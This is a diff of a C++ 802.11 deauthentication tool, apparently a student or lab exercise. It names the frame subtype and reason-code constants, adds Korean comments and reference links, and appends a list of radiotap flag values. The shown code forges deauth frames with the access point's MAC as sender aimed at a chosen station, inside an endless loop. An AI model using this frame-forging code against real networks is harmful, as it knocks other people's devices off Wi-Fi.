@@ -7,13 +7,19 @@
 
 using namespace std;
 
+//https://support.zyxel.eu/hc/en-us/articles/360009469759-What-is-the-meaning-of-802-11-Deauthentication-Reason-Codes-
+#define Deauthentication 0x0C
+#define ReceivedFromNonassociatedStation 7 // Class 3 frame received from nonassociated station -> Client attempted to transfer data before it was associated.
+
+// 참고한 duration : https://x4bx54.medium.com/use-802-11w-or-wpa3-to-prevent-de-authentication-attacks-in-your-wi-fi-network-4ce63ab20033
+
 map<Mac, BEdata> data;
 
 typedef struct DeauthFrame {
 	RTHDR radiotap;
 	uint8_t padding[3] = {0};
 	BF_ deauth;
-	uint16_t reasion;
+	uint16_t reason;
 } DF;
 
 ostream& operator<<(ostream& os, const Mac& mac){
@@ -64,15 +70,15 @@ int main(int argc, char* argv[]){
 
     packet.deauth.version = 0;
 	packet.deauth.type = 0;
-	packet.deauth.subtype = 0xc;
+	packet.deauth.subtype = Deauthentication;
 	packet.deauth.flags = 0;
-	packet.deauth.duration = 314;
+	packet.deauth.duration = 314; //microseconds
 	packet.deauth.destMac = station;
 	packet.deauth.srcMac = ap;
 	packet.deauth.BSSID = ap;
 	packet.seq_ctl = 0;
 
-	packet.reason = 7;
+	packet.reason = ReceivedFromNonassociatedStation;
 
 	while(true){
         //DF -> u_char 형식으로 packet의 데이터 값을 받아야 함. (배열 선언으로 된게 많아보였음! buffer..!)
@@ -87,3 +93,43 @@ int main(int argc, char* argv[]){
 
 	return 0;
 }
+
+
+/*presentFlat 참고용
+https://libtins.github.io/docs/latest/d7/d0e/classTins_1_1RadioTap.html
+TSFT = 1 << 0, 
+TSTF = 1 << 0, 
+FLAGS = 1 << 1, 
+RATE = 1 << 2, 
+CHANNEL = 1 << 3, 
+FHSS = 1 << 4, 
+DBM_SIGNAL = 1 << 5, 
+DBM_NOISE = 1 << 6, 
+LOCK_QUALITY = 1 << 7, 
+TX_ATTENUATION = 1 << 8, 
+B_TX_ATTENUATION = 1 << 9, 
+DBM_TX_ATTENUATION = 1 << 10, 
+ANTENNA = 1 << 11, 
+DB_SIGNAL = 1 << 12, 
+DB_NOISE = 1 << 13, 
+RX_FLAGS = 1 << 14, 
+TX_FLAGS = 1 << 15, 
+DATA_RETRIES = 1 << 17, 
+XCHANNEL = 1 << 18, 
+CHANNEL_PLUS = 1 << 18, 
+MCS = 1 << 19,
+
+AMpdu = 1 << 20,
+Vht = 1 << 21,
+Timestamp = 1 << 22,
+He = 1 << 23,
+HeMu = 1 << 24,
+HeMuOtherUser = 1 << 25,
+ZeroLenghPsdu = 1 << 26,
+LSig = 1 << 27,
+Tlv = 1 << 28, https://www.radiotap.org/fields/TLV.html
+RadiotapNamespace = 1 << 29,
+VendorNamespace = 1 << 30,
+Ext = 1 << 31
+
+*/
